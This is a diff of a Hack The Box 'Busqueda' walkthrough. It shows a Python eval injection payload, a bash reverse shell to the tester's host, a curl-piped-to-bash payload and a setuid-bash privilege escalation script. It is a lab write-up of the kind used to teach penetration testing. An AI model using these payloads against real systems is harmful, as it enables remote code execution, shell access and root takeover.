@@ -5,7 +5,7 @@ https://app.hackthebox.com/machines/537
 ## Enumeration:
 
 I began by performing a port scan and discovered that ports 22 and 80 were open:
-```
+```bash
 sudo rustscan -a 10.10.11.208 -- -sC -sV -vv -oN busqueda_nmap
 ```
 
@@ -25,7 +25,7 @@ PORT   STATE SERVICE REASON         VERSION
 Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
-The scan results showed that SSH was running on port 22, and the Apache HTTP server was running on port 80. I also discovered a domain named "searcher.htb" running on port 80 and added it to the **/etc/hosts** file.
+The scan results showed that SSH was running on port 22, and the Apache HTTP server was running on port 80. I also discovered a domain named "**searcher.htb**" running on port 80 and added it to the **/etc/hosts** file.
 
 Next, I performed vhost and sub-directory enumeration on the domain but found nothing of interest. Upon further browsing, I discovered that the website was a search tool that provided search results from various search engines on the internet.
 
@@ -67,7 +67,7 @@ if you are still getting a response and not a blank value, then you can freely c
 From the blog, I learned that we can use something like the following code to execute our payloads:
 
 ![image](https://user-images.githubusercontent.com/87700008/232022263-65166537-0f67-41f3-addb-ee4a64a3b6fd.png)
-```
+```bash
 eval(complie("code to execute"), "<String>", "exec") 
 ```
 
@@ -77,7 +77,7 @@ eval(complie("code to execute"), "<String>", "exec")
 
 After multiple attempts and failures, I finally discovered a payload that worked in the URL-encoded format for command execution:
 
-```
+```bash
 '%2beval(compile("import+os\nos.system('id')+",'<String>','exec'))%2b'
 ```
 
@@ -85,7 +85,7 @@ After multiple attempts and failures, I finally discovered a payload that worked
 
 For the reverse shell, I tried multiple payloads, but none of them worked perfectly. Then, I followed another process where I hosted a text file containing a bash reverse shell:
 
-```
+```bash
 bash -i >& /dev/tcp/10.10.X.X/1331 0>&1
 ```
 
@@ -93,7 +93,7 @@ After the server downloaded this text file, it executed the shell script from th
 
 I used this final payload, which I referenced from another user's [blog](https://blog.csdn.net/qq_58869808/article/details/130050438) :
 
-```
+```bash
 http%3a//127.0.0.1/debug'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl 10.10.14.41/1337.txt | bash ")','a','single'))%2b'
 ```
 
@@ -120,7 +120,7 @@ Finally, I logged in via SSH using the 'svc' account, which gave me the user fla
 ## Privelege Escalation:
 
 To start enumerating for root access, I first checked the sudo permissions and discovered that I could run the **system-checkup.py** script with root privileges using the following command:
-```
+```bash
 /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
@@ -133,7 +133,7 @@ I found two running docker processes, namely **gitea** and **mysql_db**.
 ![image](https://user-images.githubusercontent.com/87700008/232139320-7e50cf9f-4bf7-47e7-b42d-d955df02abfb.png)
 
 I inspected the content of **mysql_db** and obtained root credentials related to Gitea by executing the following command:
-```
+```bash
 sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' mysql_db
 ```
 
@@ -154,7 +154,7 @@ By checking the script, I observed that if we used the **full-checkup** argument
 I attempted to run the script with the **full-checkup** argument, but it did not work, possibly due to a missing script.
 
 As I discovered in the **system-checkup.py** script, there was no absolute path to run **full-checkup.sh**. Therefore, I created my own malicious script and added the following command to it:
-```
+```bash
 #!/bin/bash
 chmod +s /bin/bash
 ```
